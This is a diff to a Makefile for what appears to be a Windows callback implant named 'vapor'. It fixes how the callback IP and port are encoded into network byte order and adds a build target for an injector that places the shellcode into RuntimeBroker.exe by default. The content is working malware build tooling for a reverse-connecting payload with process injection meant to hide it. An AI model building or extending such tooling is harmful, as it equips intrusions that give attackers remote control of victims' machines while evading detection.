@@ -6,10 +6,10 @@ KEY    ?= $(shell python3 -c "import secrets; print(secrets.token_hex(32))")
 
 # Convert IP so NASM's LE DWORD storage produces network-order bytes
 # e.g., 10.10.14.1 -> memory bytes 0a 0a 0e 01
-IP_HEX  = $(shell python3 -c "import socket,struct; b=socket.inet_aton('$(LHOST)'); v=struct.unpack('!I',b)[0]; print('0x{:08x}'.format(v))")
+IP_HEX  = $(shell python3 -c "import socket,struct; b=socket.inet_aton('$(LHOST)'); v=struct.unpack('<I',b)[0]; print('0x{:08x}'.format(v))")
 
 # Convert port so NASM's LE WORD storage produces network-order bytes
-PORT_HEX = $(shell python3 -c "import struct; print('0x{:04x}'.format($(LPORT)))")
+PORT_HEX = $(shell python3 -c "import struct; v=struct.unpack('<H',struct.pack('!H',$(LPORT)))[0]; print('0x{:04x}'.format(v))")
 
 # Generate key include file with db directives
 KEY_INC = key.inc
@@ -21,7 +21,7 @@ FORCE:
 DEFINES = -DCALLBACK_IP=$(IP_HEX) \
           -DCALLBACK_PORT=$(PORT_HEX)
 
-all: vapor.bin vapor.exe
+all: vapor.bin vapor.exe injector.exe
 
 vapor.bin: vapor.asm $(KEY_INC)
 	$(NASM) -f bin $(DEFINES) vapor.asm -o $@
@@ -32,7 +32,15 @@ vapor.obj: vapor.asm $(KEY_INC)
 vapor.exe: vapor.obj
 	$(LD) --entry=_start --subsystem=windows -o $@ $<
 
+TARGET ?= C:\Windows\System32\RuntimeBroker.exe
+
+injector.obj: injector.asm vapor.bin
+	$(NASM) -f win64 -DTARGET_PROCESS="'$(TARGET)'" injector.asm -o $@
+
+injector.exe: injector.obj
+	$(LD) --entry=_start --subsystem=windows -o $@ $<
+
 clean:
-	rm -f vapor.bin vapor.obj vapor.exe $(KEY_INC)
+	rm -f vapor.bin vapor.obj vapor.exe injector.obj injector.exe $(KEY_INC)
 
 .PHONY: all clean FORCE
